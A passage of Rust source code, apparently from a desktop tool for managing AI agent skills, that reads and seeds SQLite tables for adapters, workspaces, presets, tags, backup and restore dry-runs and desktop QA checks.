    let rows = statement
        .query_map([], |row| {
            Ok(AgentAdapterCard {
                id: row.get(0)?,
                name: row.get(1)?,
                vendor: row.get(2)?,
                skills_path_hint: row.get(3)?,
                detection_kind: row.get(4)?,
                install_scope: row.get(5)?,
                capability_level: row.get(6)?,
                docs_url: row.get(7)?,
                status: row.get(8)?,
                detected: row.get::<_, i64>(9)? != 0,
                managed: row.get::<_, i64>(10)? != 0,
                enabled: row.get::<_, i64>(11)? != 0,
            })
        })
        .map_err(|error| format!("Cannot read agent adapters: {}", error))?;

    collect_rows(rows, "agent adapter")
}

fn read_indexed_adapter_safety_checks(
    connection: &Connection,
) -> Result<Vec<AdapterSafetyCheckCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT id, adapter_id, check_key, status, summary
            FROM adapter_safety_checks
            ORDER BY adapter_id, check_key",
        )
        .map_err(|error| format!("Cannot prepare adapter safety check query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(AdapterSafetyCheckCard {
                id: row.get(0)?,
                adapter_id: row.get(1)?,
                check_key: row.get(2)?,
                status: row.get(3)?,
                summary: row.get(4)?,
            })
        })
        .map_err(|error| format!("Cannot read adapter safety checks: {}", error))?;

    collect_rows(rows, "adapter safety check")
}

fn read_indexed_adapter_capabilities(
    connection: &Connection,
) -> Result<Vec<AdapterCapabilityCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT id, adapter_id, capability_key, enabled, summary
            FROM adapter_capabilities
            ORDER BY adapter_id, capability_key",
        )
        .map_err(|error| format!("Cannot prepare adapter capability query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(AdapterCapabilityCard {
                id: row.get(0)?,
                adapter_id: row.get(1)?,
                capability_key: row.get(2)?,
                enabled: row.get::<_, i64>(3)? != 0,
                summary: row.get(4)?,
            })
        })
        .map_err(|error| format!("Cannot read adapter capabilities: {}", error))?;

    collect_rows(rows, "adapter capability")
}

fn read_indexed_workspaces(connection: &Connection) -> Result<Vec<WorkspaceCard>, String> {
    let total_skills = connection
        .query_row("SELECT COUNT(*) FROM skills WHERE enabled = 1", [], |row| {
            row.get::<_, i64>(0)
        })
        .unwrap_or(0) as usize;

    let mut statement = connection
        .prepare(
            "SELECT
                workspaces.id,
                workspaces.name,
                workspaces.scope,
                COALESCE(workspaces.path, ''),
                workspaces.enabled,
                COUNT(workspace_agents.agent_id)
            FROM workspaces
            LEFT JOIN workspace_agents ON workspace_agents.workspace_id = workspaces.id
            GROUP BY workspaces.id
            ORDER BY
                CASE workspaces.scope WHEN 'global' THEN 0 WHEN 'agent' THEN 1 ELSE 2 END,
                lower(workspaces.name)",
        )
        .map_err(|error| format!("Cannot prepare indexed workspace query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            let scope: String = row.get(2)?;
            Ok(WorkspaceCard {
                id: row.get(0)?,
                name: row.get(1)?,
                scope: scope.clone(),
                path: row.get(3)?,
                enabled: row.get::<_, i64>(4)? != 0,
                agent_count: row.get::<_, i64>(5)? as usize,
                skill_count: if scope == "global" { total_skills } else { 0 },
            })
        })
        .map_err(|error| format!("Cannot read indexed workspaces: {}", error))?;

    collect_rows(rows, "workspace")
}

fn read_indexed_project_scans(connection: &Connection) -> Result<Vec<ProjectScanCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT
                id,
                workspace_id,
                path,
                has_git,
                has_package_json,
                has_cargo_toml,
                has_tauri_config,
                has_agents_md,
                has_claude_md,
                has_readme_md,
                file_count,
                scanned_at
            FROM project_scans
            ORDER BY path",
        )
        .map_err(|error| format!("Cannot prepare project scan query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(ProjectScanCard {
                id: row.get(0)?,
                workspace_id: row.get(1)?,
                path: row.get(2)?,
                has_git: row.get::<_, i64>(3)? != 0,
                has_package_json: row.get::<_, i64>(4)? != 0,
                has_cargo_toml: row.get::<_, i64>(5)? != 0,
                has_tauri_config: row.get::<_, i64>(6)? != 0,
                has_agents_md: row.get::<_, i64>(7)? != 0,
                has_claude_md: row.get::<_, i64>(8)? != 0,
                has_readme_md: row.get::<_, i64>(9)? != 0,
                file_count: row.get::<_, i64>(10)? as usize,
                scanned_at: row.get(11)?,
            })
        })
        .map_err(|error| format!("Cannot read project scans: {}", error))?;

    collect_rows(rows, "project scan")
}

fn read_indexed_presets(connection: &Connection) -> Result<Vec<PresetCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT
                presets.id,
                presets.name,
                presets.description,
                presets.color,
                presets.enabled,
                COUNT(DISTINCT preset_skills.skill_id),
                COUNT(DISTINCT CASE
                    WHEN preset_workspaces.enabled != 0 THEN preset_workspaces.workspace_id
                    ELSE NULL
                END)
            FROM presets
            LEFT JOIN preset_skills ON preset_skills.preset_id = presets.id
            LEFT JOIN preset_workspaces ON preset_workspaces.preset_id = presets.id
            GROUP BY presets.id
            ORDER BY
                CASE presets.id WHEN 'preset-all' THEN 0 ELSE 1 END,
                lower(presets.name)",
        )
        .map_err(|error| format!("Cannot prepare indexed preset query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(PresetCard {
                id: row.get(0)?,
                name: row.get(1)?,
                description: row.get(2)?,
                color: row.get(3)?,
                enabled: row.get::<_, i64>(4)? != 0,
                skill_count: row.get::<_, i64>(5)? as usize,
                workspace_count: row.get::<_, i64>(6)? as usize,
            })
        })
        .map_err(|error| format!("Cannot read indexed presets: {}", error))?;

    collect_rows(rows, "preset")
}

fn read_indexed_tags(connection: &Connection) -> Result<Vec<TagCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT
                tags.id,
                tags.name,
                tags.color,
                COUNT(DISTINCT skill_targets.skill_id)
                    + COUNT(DISTINCT source_targets.source_id) AS target_count
            FROM tags
            LEFT JOIN (
                SELECT skill_id, tag_id FROM skill_tags
                UNION
                SELECT skill_id, tag_id FROM skill_tag_overrides
            ) AS skill_targets ON skill_targets.tag_id = tags.id
            LEFT JOIN (
                SELECT source_id, tag_id FROM source_tags
                UNION
                SELECT source_id, tag_id FROM source_tag_overrides
            ) AS source_targets ON source_targets.tag_id = tags.id
            GROUP BY tags.id
            ORDER BY target_count DESC, lower(tags.name)",
        )
        .map_err(|error| format!("Cannot prepare indexed tag query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(TagCard {
                id: row.get(0)?,
                name: row.get(1)?,
                color: row.get(2)?,
                target_count: row.get::<_, i64>(3)? as usize,
            })
        })
        .map_err(|error| format!("Cannot read indexed tags: {}", error))?;

    collect_rows(rows, "tag")
}

fn read_indexed_skill_folders(connection: &Connection) -> Result<Vec<SkillFolderCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT
                skill_folders.id,
                skill_folders.name,
                skill_folders.note,
                skill_folders.color,
                skill_folders.sort_order,
                (
                    SELECT COUNT(*)
                    FROM skills source_skills
                    INNER JOIN source_folder_memberships
                        ON source_folder_memberships.source_id = source_skills.source_id
                    WHERE source_folder_memberships.folder_id = skill_folders.id
                ) + (
                    SELECT COUNT(*)
                    FROM skill_folder_memberships standalone_memberships
                    INNER JOIN skills standalone_skills ON standalone_skills.id = standalone_memberships.skill_id
                    WHERE standalone_memberships.folder_id = skill_folders.id
                      AND (standalone_skills.source_id IS NULL OR standalone_skills.source_id = '')
                ) AS skill_count,
                skill_folders.created_at,
                skill_folders.updated_at
             FROM skill_folders
             ORDER BY skill_folders.sort_order, lower(skill_folders.name)",
        )
        .map_err(|error| format!("Cannot prepare Skill folder query: {}", error))?;
    let rows = statement
        .query_map([], |row| {
            Ok(SkillFolderCard {
                id: row.get(0)?,
                name: row.get(1)?,
                note: row.get(2)?,
                color: row.get(3)?,
                sort_order: row.get(4)?,
                skill_count: row.get::<_, i64>(5)?.max(0) as usize,
                created_at: row.get(6)?,
                updated_at: row.get(7)?,
            })
        })
        .map_err(|error| format!("Cannot read Skill folders: {}", error))?;
    collect_rows(rows, "Skill folder")
}

fn read_tag_map(
    connection: &Connection,
    target_type: &str,
) -> Result<HashMap<String, Vec<String>>, String> {
    let query = match target_type {
        "skill" => {
            "SELECT target_id, name FROM (
                SELECT skill_tags.skill_id AS target_id, tags.name AS name
                FROM skill_tags
                INNER JOIN tags ON tags.id = skill_tags.tag_id
                UNION
                SELECT skill_tag_overrides.skill_id AS target_id, tags.name AS name
                FROM skill_tag_overrides
                INNER JOIN tags ON tags.id = skill_tag_overrides.tag_id
            ) ORDER BY lower(name)"
        }
        "source" => {
            "SELECT target_id, name FROM (
                SELECT source_tags.source_id AS target_id, tags.name AS name
                FROM source_tags
                INNER JOIN tags ON tags.id = source_tags.tag_id
                UNION
                SELECT source_tag_overrides.source_id AS target_id, tags.name AS name
                FROM source_tag_overrides
                INNER JOIN tags ON tags.id = source_tag_overrides.tag_id
            ) ORDER BY lower(name)"
        }
        _ => return Err("Unsupported tag target type.".to_string()),
    };

    let mut statement = connection
        .prepare(query)
        .map_err(|error| format!("Cannot prepare {} tag query: {}", target_type, error))?;
    let rows = statement
        .query_map([], |row| {
            Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
        })
        .map_err(|error| format!("Cannot read {} tags: {}", target_type, error))?;

    let mut output: HashMap<String, Vec<String>> = HashMap::new();
    for row in rows {
        let (target_id, tag) =
            row.map_err(|error| format!("Cannot decode {} tag: {}", target_type, error))?;
        let tags = output.entry(target_id).or_default();
        if !tags.iter().any(|item| item.eq_ignore_ascii_case(&tag)) {
            tags.push(tag);
        }
    }

    Ok(output)
}

fn read_indexed_preset_distributions(
    connection: &Connection,
) -> Result<Vec<PresetDistributionCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT
                presets.id,
                presets.name,
                workspaces.id,
                workspaces.name,
                workspaces.scope,
                COALESCE(preset_workspaces.enabled,
                    CASE
                        WHEN presets.id = 'preset-all' AND workspaces.scope = 'global' THEN 1
                        ELSE 0
                    END
                ) AS enabled,
                COUNT(DISTINCT preset_skills.skill_id) AS skill_count
            FROM presets
            CROSS JOIN workspaces
            LEFT JOIN preset_workspaces
                ON preset_workspaces.preset_id = presets.id
                AND preset_workspaces.workspace_id = workspaces.id
            LEFT JOIN preset_skills ON preset_skills.preset_id = presets.id
            GROUP BY presets.id, workspaces.id
            ORDER BY
                CASE workspaces.scope WHEN 'global' THEN 0 WHEN 'agent' THEN 1 ELSE 2 END,
                lower(workspaces.name),
                CASE presets.id WHEN 'preset-all' THEN 0 ELSE 1 END,
                lower(presets.name)",
        )
        .map_err(|error| format!("Cannot prepare preset distribution query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            let preset_id = row.get::<_, String>(0)?;
            let preset_name = row.get::<_, String>(1)?;
            let workspace_id = row.get::<_, String>(2)?;
            let workspace_name = row.get::<_, String>(3)?;
            let workspace_scope = row.get::<_, String>(4)?;
            let enabled = row.get::<_, i64>(5)? != 0;
            let skill_count = row.get::<_, i64>(6)? as usize;
            Ok(PresetDistributionCard {
                id: stable_id(
                    "preset-workspace",
                    &format!("{}-{}", preset_id, workspace_id),
                ),
                preset_id,
                preset_name: preset_name.clone(),
                workspace_id,
                workspace_name: workspace_name.clone(),
                workspace_scope: workspace_scope.clone(),
                enabled,
                skill_count,
                status: if enabled { "enabled" } else { "available" }.to_string(),
                summary: if enabled {
                    format!(
                        "{} 已面向 {} 启用；包含 {} 个 Skill。",
                        preset_name, workspace_name, skill_count
                    )
                } else {
                    format!(
                        "{} 可分发到 {}；当前未启用，不会写入工具目录。",
                        preset_name, workspace_name
                    )
                },
            })
        })
        .map_err(|error| format!("Cannot read preset distributions: {}", error))?;

    collect_rows(rows, "preset distribution")
}

fn read_indexed_operation_runners(
    connection: &Connection,
    root: &Path,
) -> Result<Vec<OperationRunnerCard>, String> {
    let mut runners = Vec::new();
    for (runner_id, runner_type, locked, default_summary, next_action) in operation_runner_catalog()
    {
        let latest = connection
            .query_row(
                "SELECT status, summary, report_path, created_at
                FROM operation_runs
                WHERE runner_id = ?1
                ORDER BY CAST(created_at AS INTEGER) DESC
                LIMIT 1",
                params![runner_id],
                |row| {
                    Ok((
                        row.get::<_, String>(0)?,
                        row.get::<_, String>(1)?,
                        row.get::<_, String>(2)?,
                        row.get::<_, String>(3)?,
                    ))
                },
            )
            .optional()
            .map_err(|error| format!("Cannot read latest operation run: {}", error))?;
        let (status, summary, report_path, last_run_at) = latest.unwrap_or_else(|| {
            (
                if locked { "locked" } else { "ready" }.to_string(),
                default_summary.to_string(),
                private_state_dir(root)
                    .join("reports")
                    .join(runner_report_folder(runner_id))
                    .join(format!("latest-{}.md", runner_id))
                    .display()
                    .to_string(),
                String::new(),
            )
        });
        let export_dir = Path::new(&report_path)
            .parent()
            .map(Path::to_path_buf)
            .unwrap_or_else(|| {
                private_state_dir(root)
                    .join("reports")
                    .join(runner_report_folder(runner_id))
            });
        let latest_json_path = export_dir.join(format!("latest-{}.json", runner_id));
        let latest_markdown_path = export_dir.join(format!("latest-{}.md", runner_id));
        let manifest_path = export_dir.join(format!("latest-{}-manifest.json", runner_id));
        let file_count = fs::read_dir(&export_dir)
            .map(|entries| {
                entries
                    .filter_map(Result::ok)
                    .filter(|entry| entry.path().is_file())
                    .count()
            })
            .unwrap_or(0);
        runners.push(OperationRunnerCard {
            id: runner_id.to_string(),
            title: runner_title(runner_id),
            runner_type: runner_type.to_string(),
            status,
            locked,
            last_run_at,
            export_dir: export_dir.display().to_string(),
            report_path,
            latest_json_path: latest_json_path.display().to_string(),
            latest_markdown_path: latest_markdown_path.display().to_string(),
            manifest_path: manifest_path.display().to_string(),
            file_count,
            summary,
            next_action: next_action.to_string(),
        });
    }

    Ok(runners)
}

fn read_indexed_snapshots(connection: &Connection) -> Result<Vec<SnapshotCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT id, name, summary, created_at
            FROM snapshots
            ORDER BY CAST(created_at AS INTEGER) DESC
            LIMIT 8",
        )
        .map_err(|error| format!("Cannot prepare snapshot query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(SnapshotCard {
                id: row.get(0)?,
                name: row.get(1)?,
                summary: row.get(2)?,
                created_at: row.get(3)?,
                is_latest: false,
            })
        })
        .map_err(|error| format!("Cannot read snapshots: {}", error))?;

    let mut snapshots = collect_rows(rows, "snapshot")?;
    for (index, snapshot) in snapshots.iter_mut().enumerate() {
        snapshot.is_latest = index == 0;
    }
    Ok(snapshots)
}

fn read_indexed_backup_targets(connection: &Connection) -> Result<Vec<BackupTargetCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT
                id,
                adapter_id,
                agent_name,
                target_path,
                backup_path,
                detected,
                managed,
                required,
                preflight_status,
                risk_level,
                blocker
            FROM backup_targets
            ORDER BY
                required DESC,
                CASE preflight_status
                    WHEN 'blocked' THEN 0
                    WHEN 'required' THEN 1
                    WHEN 'ready' THEN 2
                    ELSE 3
                END,
                lower(agent_name)",
        )
        .map_err(|error| format!("Cannot prepare backup target query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(BackupTargetCard {
                id: row.get(0)?,
                adapter_id: row.get(1)?,
                agent_name: row.get(2)?,
                target_path: row.get(3)?,
                backup_path: row.get(4)?,
                detected: row.get::<_, i64>(5)? != 0,
                managed: row.get::<_, i64>(6)? != 0,
                required: row.get::<_, i64>(7)? != 0,
                preflight_status: row.get(8)?,
                risk_level: row.get(9)?,
                blocker: row.get(10)?,
            })
        })
        .map_err(|error| format!("Cannot read backup targets: {}", error))?;

    collect_rows(rows, "backup target")
}

fn read_indexed_backup_dry_run(
    connection: &Connection,
) -> Result<Vec<BackupDryRunItemCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT
                id,
                backup_target_id,
                adapter_id,
                agent_name,
                action,
                target_path,
                backup_path,
                status,
                risk_level,
                summary
            FROM backup_dry_run_items
            ORDER BY
                CASE status
                    WHEN 'blocked' THEN 0
                    WHEN 'planned' THEN 1
                    WHEN 'ready' THEN 2
                    ELSE 3
                END,
                lower(agent_name)",
        )
        .map_err(|error| format!("Cannot prepare backup dry-run query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(BackupDryRunItemCard {
                id: row.get(0)?,
                backup_target_id: row.get(1)?,
                adapter_id: row.get(2)?,
                agent_name: row.get(3)?,
                action: row.get(4)?,
                target_path: row.get(5)?,
                backup_path: row.get(6)?,
                status: row.get(7)?,
                risk_level: row.get(8)?,
                summary: row.get(9)?,
            })
        })
        .map_err(|error| format!("Cannot read backup dry-run items: {}", error))?;

    collect_rows(rows, "backup dry-run item")
}

fn read_indexed_restore_dry_run(
    connection: &Connection,
) -> Result<Vec<RestoreDryRunItemCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT
                id,
                backup_target_id,
                adapter_id,
                agent_name,
                action,
                target_path,
                backup_path,
                status,
                risk_level,
                summary
            FROM restore_dry_run_items
            ORDER BY
                CASE status
                    WHEN 'blocked' THEN 0
                    WHEN 'planned' THEN 1
                    WHEN 'ready' THEN 2
                    ELSE 3
                END,
                lower(agent_name)",
        )
        .map_err(|error| format!("Cannot prepare restore dry-run query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(RestoreDryRunItemCard {
                id: row.get(0)?,
                backup_target_id: row.get(1)?,
                adapter_id: row.get(2)?,
                agent_name: row.get(3)?,
                action: row.get(4)?,
                target_path: row.get(5)?,
                backup_path: row.get(6)?,
                status: row.get(7)?,
                risk_level: row.get(8)?,
                summary: row.get(9)?,
            })
        })
        .map_err(|error| format!("Cannot read restore dry-run items: {}", error))?;

    collect_rows(rows, "restore dry-run item")
}

fn read_indexed_rollback_plan(
    connection: &Connection,
) -> Result<Vec<RollbackPlanStepCard>, String> {
    let latest_snapshot_id = connection
        .query_row(
            "SELECT id FROM snapshots ORDER BY CAST(created_at AS INTEGER) DESC LIMIT 1",
            [],
            |row| row.get::<_, String>(0),
        )
        .optional()
        .map_err(|error| format!("Cannot read rollback plan snapshot id: {}", error))?;

    let Some(snapshot_id) = latest_snapshot_id else {
        return Ok(Vec::new());
    };

    let mut statement = connection
        .prepare(
            "SELECT id, snapshot_id, step_order, title, risk_level, status, summary
            FROM rollback_plan_steps
            WHERE snapshot_id = ?1
            ORDER BY step_order",
        )
        .map_err(|error| format!("Cannot prepare rollback plan query: {}", error))?;

    let rows = statement
        .query_map(params![snapshot_id], |row| {
            Ok(RollbackPlanStepCard {
                id: row.get(0)?,
                snapshot_id: row.get(1)?,
                step_order: row.get::<_, i64>(2)? as usize,
                title: row.get(3)?,
                risk_level: row.get(4)?,
                status: row.get(5)?,
                summary: row.get(6)?,
            })
        })
        .map_err(|error| format!("Cannot read rollback plan: {}", error))?;

    collect_rows(rows, "rollback plan step")
}

fn read_indexed_desktop_qa_checks(
    connection: &Connection,
) -> Result<Vec<DesktopQaCheckCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT id, title, description, status, required, evidence, updated_at
            FROM desktop_qa_checks
            ORDER BY
                required DESC,
                CASE status
                    WHEN 'failed' THEN 0
                    WHEN 'pending' THEN 1
                    WHEN 'passed' THEN 2
                    ELSE 3
                END,
                id",
        )
        .map_err(|error| format!("Cannot prepare desktop QA query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(DesktopQaCheckCard {
                id: row.get(0)?,
                title: row.get(1)?,
                description: row.get(2)?,
                status: row.get(3)?,
                required: row.get::<_, i64>(4)? != 0,
                evidence: row.get(5)?,
                updated_at: row.get(6)?,
            })
        })
        .map_err(|error| format!("Cannot read desktop QA checks: {}", error))?;

    collect_rows(rows, "desktop QA check")
}

fn read_index_report(
    connection: &Connection,
    db_file: &Path,
    source_count: usize,
    skill_count: usize,
    agent_count: usize,
) -> Result<IndexReport, String> {
    let latest = connection
        .query_row(
            "SELECT id, created_at FROM snapshots ORDER BY CAST(created_at AS INTEGER) DESC LIMIT 1",
            [],
            |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?)),
        )
        .optional()
        .map_err(|error| format!("Cannot read latest v2 snapshot: {}", error))?;

    let (snapshot_id, indexed_at) =
        latest.unwrap_or_else(|| ("sqlite-index-empty".to_string(), String::new()));

    Ok(IndexReport {
        persisted: true,
        database_file: db_file.display().to_string(),
        indexed_at,
        sources_indexed: source_count,
        skills_indexed: skill_count,
        agents_indexed: agent_count,
        snapshot_id,
    })
}

fn read_indexed_diagnostics(connection: &Connection) -> DiagnosticSummary {
    let manifest = connection
        .query_row(
            "SELECT manifest_json FROM snapshots ORDER BY CAST(created_at AS INTEGER) DESC LIMIT 1",
            [],
            |row| row.get::<_, String>(0),
        )
        .optional()
        .ok()
        .flatten()
        .and_then(|raw| serde_json::from_str::<Value>(&raw).ok());

    let Some(diagnostics) = manifest.as_ref().and_then(|value| value.get("diagnostics")) else {
        return DiagnosticSummary {
            available: false,
            app_version: String::new(),
            generated_at: String::new(),
            overall_status: "indexed".to_string(),
            ok: 0,
            warn: 0,
            error: 0,
            info: 0,
        };
    };

    DiagnosticSummary {
        available: json_bool(diagnostics, "available"),
        app_version: json_string(diagnostics, "appVersion"),
        generated_at: json_string(diagnostics, "generatedAt"),
        overall_status: json_string(diagnostics, "overallStatus"),
        ok: json_u64(diagnostics, "ok"),
        warn: json_u64(diagnostics, "warn"),
        error: json_u64(diagnostics, "error"),
        info: json_u64(diagnostics, "info"),
    }
}

fn collect_rows<T>(
    rows: impl Iterator<Item = rusqlite::Result<T>>,
    label: &str,
) -> Result<Vec<T>, String> {
    let mut items = Vec::new();
    for row in rows {
        items.push(row.map_err(|error| format!("Cannot decode indexed {}: {}", label, error))?);
    }
    Ok(items)
}

fn load_enabled_state(connection: &Connection) -> EnabledState {
    EnabledState {
        agents: read_enabled_map(connection, "agents"),
        agent_adapters: read_enabled_map(connection, "agent_adapters"),
        workspaces: read_enabled_map(connection, "workspaces"),
        presets: read_enabled_map(connection, "presets"),
    }
}

fn apply_enabled_state(snapshot: &mut LegacySnapshot, enabled_state: &EnabledState) {
    for agent in &mut snapshot.agents {
        let agent_id = stable_id("agent", &agent.id);
        if let Some(enabled) = enabled_state.agents.get(&agent_id) {
            agent.enabled = *enabled;
        }
    }
    for adapter in &mut snapshot.agent_adapters {
        if let Some(enabled) = enabled_state.agent_adapters.get(&adapter.id) {
            adapter.enabled = *enabled;
        }
    }
    for workspace in &mut snapshot.workspaces {
        if let Some(enabled) = enabled_state.workspaces.get(&workspace.id) {
            workspace.enabled = *enabled;
        }
    }
    for preset in &mut snapshot.presets {
        if let Some(enabled) = enabled_state.presets.get(&preset.id) {
            preset.enabled = *enabled;
        }
    }
}

fn read_enabled_map(connection: &Connection, table_name: &str) -> HashMap<String, bool> {
    let statement = match table_name {
        "agents" => "SELECT id, enabled FROM agents",
        "agent_adapters" => "SELECT id, enabled FROM agent_adapters",
        "workspaces" => "SELECT id, enabled FROM workspaces",
        "presets" => "SELECT id, enabled FROM presets",
        _ => return HashMap::new(),
    };
    let Ok(mut query) = connection.prepare(statement) else {
        return HashMap::new();
    };
    let Ok(rows) = query.query_map([], |row| {
        Ok((row.get::<_, String>(0)?, row.get::<_, i64>(1)? != 0))
    }) else {
        return HashMap::new();
    };

    rows.filter_map(Result::ok).collect()
}

fn seed_desktop_qa_checks(connection: &Connection) -> Result<(), String> {
    let timestamp = unix_timestamp_string();
    for check in desktop_qa_catalog() {
        connection
            .execute(
                "INSERT OR IGNORE INTO desktop_qa_checks (
                    id, title, description, status, required, evidence, updated_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
                params![
                    &check.id,
                    &check.title,
                    &check.description,
                    &check.status,
                    if check.required { 1 } else { 0 },
                    &check.evidence,
                    &timestamp
                ],
            )
            .map_err(|error| format!("Cannot seed desktop QA check {}: {}", check.id, error))?;
    }
    Ok(())
}

fn desktop_qa_catalog() -> Vec<DesktopQaCheckCard> {
    vec![
        desktop_qa_check(
            "window-readable",
            "默认窗口完整可读",
            "侧边栏、主标题、指标卡和滚动条不能被裁切；默认窗口尺寸下必须能直接操作。",
        ),
        desktop_qa_check(
            "dpi-clarity",
            "高 DPI 清晰度",
            "真实 Tauri 桌面窗口里的中文、英文、数字和胶囊状态不能发虚，不能用浏览器预览代替。",
        ),
        desktop_qa_check(
            "release-gate-readable",
            "发布闸门可读",
            "诊断、发布预检、分享验收、zip 预览和桌面 QA 状态必须能被清楚读到。",
        ),
        desktop_qa_check(
            "snapshot-safety",
            "快照与恢复仍锁定",
            "备份、恢复和真实同步必须保持预演/锁定状态，不能出现误触发真实写入的入口。",
        ),
        desktop_qa_check(
            "release-build-guidance",
            "发布说明清楚",
            "用户必须能区分开发命令、调试 exe 和未来正式打包产物。",
        ),
    ]
}

fn desktop_qa_check(id: &str, title: &str, description: &str) -> DesktopQaCheckCard {
    DesktopQaCheckCard {
        id: id.to_string(),
        title: title.to_string(),
        description: description.to_string(),
        status: "pending".to_string(),
        required: true,
        evidence: String::new(),
        updated_at: String::new(),
    }
}

fn seed_agent_adapters(
    transaction: &rusqlite::Transaction<'_>,
    adapters: &[AgentAdapterCard],
    safety_checks: &[AdapterSafetyCheckCard],
    capabilities: &[AdapterCapabilityCard],
    enabled_state: &EnabledState,
    timestamp: &str,
) -> Result<(), String> {
    for adapter in adapters {
        let enabled = enabled_state
            .agent_adapters
            .get(&adapter.id)
            .copied()
            .unwrap_or(adapter.enabled);
        transaction
            .execute(
                "INSERT INTO agent_adapters (
                    id, name, vendor, skills_path_hint, detection_kind,
                    install_scope, capability_level, docs_url, status,
                    detected, managed, enabled, created_at, updated_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13, ?13)",
                params![
                    adapter.id,
                    adapter.name,
                    adapter.vendor,
                    adapter.skills_path_hint,
                    adapter.detection_kind,
                    adapter.install_scope,
                    adapter.capability_level,
                    adapter.docs_url,
                    adapter.status,
                    if adapter.detected { 1 } else { 0 },
                    if adapter.managed { 1 } else { 0 },
                    if enabled { 1 } else { 0 },
                    timestamp
                ],
            )
            .map_err(|error| format!("Cannot seed agent adapter {}: {}", adapter.name, error))?;
    }

    for check in safety_checks {
        transaction
            .execute(
                "INSERT INTO adapter_safety_checks (
                    id, adapter_id, check_key, status, summary, created_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
                params![
                    check.id,
                    check.adapter_id,
                    check.check_key,
                    check.status,
                    check.summary,
                    timestamp
                ],
            )
            .map_err(|error| {
                format!(
                    "Cannot seed adapter safety check {} for {}: {}",
                    check.check_key, check.adapter_id, error
                )
            })?;
    }

    for capability in capabilities {
        transaction
            .execute(
                "INSERT INTO adapter_capabilities (
                    id, adapter_id, capability_key, enabled, summary, created_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
                params![
                    capability.id,
                    capability.adapter_id,
                    capability.capability_key,
                    if capability.enabled { 1 } else { 0 },
                    capability.summary,
                    timestamp
                ],
            )
            .map_err(|error| {
                format!(
                    "Cannot seed adapter capability {} for {}: {}",
                    capability.capability_key, capability.adapter_id, error
                )
            })?;
    }

    Ok(())
}

fn seed_workspaces(
    transaction: &rusqlite::Transaction<'_>,
    root: &Path,
    agents: &[AgentCard],
    total_skills: usize,
    enabled_state: &EnabledState,
    timestamp: &str,
) -> Result<(), String> {
    let workspaces = derive_workspaces(root, agents, total_skills);

    for workspace in &workspaces {
        let enabled = enabled_state
            .workspaces
            .get(&workspace.id)
            .copied()
            .unwrap_or(workspace.enabled);
        transaction
            .execute(
                "INSERT INTO workspaces (
                    id, name, scope, path, enabled, created_at, updated_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?6)",
                params![
                    workspace.id,
                    workspace.name,
                    workspace.scope,
                    workspace.path,
                    if enabled { 1 } else { 0 },
                    timestamp
                ],
            )
            .map_err(|error| format!("Cannot seed workspace {}: {}", workspace.name, error))?;
    }

    for agent in agents.iter().filter(|agent| agent.detected) {
        let agent_workspace_id = stable_id("workspace-agent", &agent.id);
        let agent_id = stable_id("agent", &agent.id);
        transaction
            .execute(
                "INSERT INTO workspace_agents (
                    workspace_id, agent_id, enabled
                ) VALUES (?1, ?2, 1)",
                params![agent_workspace_id, agent_id],
            )
            .map_err(|error| format!("Cannot link workspace agent {}: {}", agent.name, error))?;
    }

    Ok(())
}

fn seed_project_scans(
    transaction: &rusqlite::Transaction<'_>,
    project_scans: &[ProjectScanCard],
) -> Result<(), String> {
    for scan in project_scans {
        transaction
            .execute(
                "INSERT INTO project_scans (
                    id, workspace_id, path, has_git, has_package_json,
                    has_cargo_toml, has_tauri_config, has_agents_md,
                    has_claude_md, has_readme_md, file_count, scanned_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12)",
                params![
                    scan.id,
                    scan.workspace_id,
                    scan.path,
                    if scan.has_git { 1 } else { 0 },
                    if scan.has_package_json { 1 } else { 0 },
                    if scan.has_cargo_toml { 1 } else { 0 },
                    if scan.has_tauri_config { 1 } else { 0 },
                    if scan.has_agents_md { 1 } else { 0 },
                    if scan.has_claude_md { 1 } else { 0 },
                    if scan.has_readme_md { 1 } else { 0 },
                    scan.file_count as i64,
                    scan.scanned_at
                ],
            )
            .map_err(|error| format!("Cannot seed project scan {}: {}", scan.path, error))?;
    }

    Ok(())
}

fn seed_backup_targets(
    transaction: &rusqlite::Transaction<'_>,
    backup_targets: &[BackupTargetCard],
    timestamp: &str,
) -> Result<(), String> {
    for target in backup_targets {
        transaction
            .execute(
                "INSERT INTO backup_targets (
                    id, adapter_id, agent_name, target_path, backup_path,
                    detected, managed, required, preflight_status,
                    risk_level, blocker, created_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12)",
                params![
                    target.id,
                    target.adapter_id,
                    target.agent_name,
                    target.target_path,
                    target.backup_path,
